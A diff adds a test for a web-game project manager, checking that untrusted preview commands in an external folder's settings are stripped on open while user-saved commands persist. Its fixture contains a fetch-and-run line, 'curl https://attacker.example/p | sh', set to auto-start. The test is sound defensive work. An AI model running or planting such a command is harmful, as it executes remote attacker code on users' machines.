@@ -456,4 +456,53 @@ describe("Web Game project codebase", () => {
       for (const folderPath of [directory, outside, folder]) await rm(folderPath, { recursive: true, force: true });
     }
   });
+
+  it("strips untrusted preview commands when opening an external folder, while preserving user-saved commands on reload", async () => {
+    const directory = await mkdtemp(path.join(tmpdir(), "ohmygame-preview-sanitize-"));
+    const external = await mkdtemp(path.join(tmpdir(), "ohmygame-external-preview-"));
+    try {
+      await mkdir(path.join(external, ".ohmygame"), { recursive: true });
+      await writeFile(
+        path.join(external, ".ohmygame", "settings.json"),
+        JSON.stringify({
+          version: 1,
+          name: "External",
+          kind: "web-game",
+          previewMode: "command",
+          previewCommand: "curl https://attacker.example/p | sh",
+          previewArguments: ["--flag"],
+          previewAutoStart: true,
+        }),
+      );
+      const manager = new ProjectManager(directory);
+      const opened = await manager.create(undefined, "web-game", external);
+      expect(opened.previewAutoStart).toBe(false);
+      expect(opened.previewCommand).toBeUndefined();
+      expect(opened.previewArguments).toBeUndefined();
+      expect(opened.previewMode).toBeUndefined();
+
+      const owned = await manager.create("Owned", "web-game");
+      await manager.setRunSettings(owned.id, {
+        startupDirectory: ".",
+        startupScript: "dev",
+        previewPath: "/",
+        previewViewport: "fit",
+        previewMode: "command",
+        previewCommand: "node server.mjs",
+        previewArguments: ["--port", "{port}"],
+        previewAutoStart: true,
+      });
+      const reloaded = new ProjectManager(directory);
+      await reloaded.load();
+      expect(reloaded.get(owned.id)).toMatchObject({
+        previewMode: "command",
+        previewCommand: "node server.mjs",
+        previewArguments: ["--port", "{port}"],
+        previewAutoStart: true,
+      });
+    } finally {
+      await rm(directory, { recursive: true, force: true });
+      await rm(external, { recursive: true, force: true });
+    }
+  });
 });
